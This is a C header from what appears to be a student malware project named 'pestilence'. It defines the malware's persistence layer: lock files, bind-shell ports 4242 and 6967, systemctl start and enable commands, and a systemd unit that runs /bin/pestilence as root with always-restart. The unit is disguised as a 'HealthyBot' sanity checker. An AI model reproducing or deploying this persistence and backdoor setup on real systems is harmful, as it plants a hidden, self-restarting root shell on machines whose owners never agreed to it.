/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   service.h                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/04/19 11:01:52 by mbatty            #+#    #+#             */
/*   Updated: 2026/05/26 04:01:38 by pboucher         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma once

#include "server.h"

typedef struct s_service_ctx
{
	int		lock_fd;
	bool	super_user;

	t_server	server;
	bool		running;
}	t_service_ctx;

#define SUPER_USER_LOCK_FILE "/var/lock/pestilence.lock"
#define WEAK_LOCK_FILE "/tmp/pestilence.lock"

#define SUPER_USER_BIND_SHELL_PORT 4242
#define WEAK_BIND_SHELL_PORT 6967

#define BIN_PATH "/bin/pestilence"

#define SERVICE_FILE "/etc/systemd/system/pestilence.service"
#define SERVICE_START "sudo systemctl start pestilence.service &"
#define SERVICE_ENABLE "systemctl enable pestilence.service &"
#define SERVICE_RESTART "systemctl restart pestilence.service &"
#define SERVICE_FILE_CONTENT "\
[Unit]\n\
Description=HealthyBot: IA Sanity Checker (it's real bro i swear...)\n\
After=network.target\n\
StartLimitIntervalSec=0\n\
[Service]\n\
Type=forking\n\
PIDFile=/var/lock/pestilence.lock\n\
Restart=always\n\
RestartSec=1\n\
User=root\n\
ExecStart=/bin/pestilence\n\
\n\
[Install]\n\
WantedBy=multi-user.target"

int		run_service(const char *bin_path);

int		lock_lock(t_service_ctx *ctx, const char *path);
int		unlock_lock(t_service_ctx *ctx, const char *path);
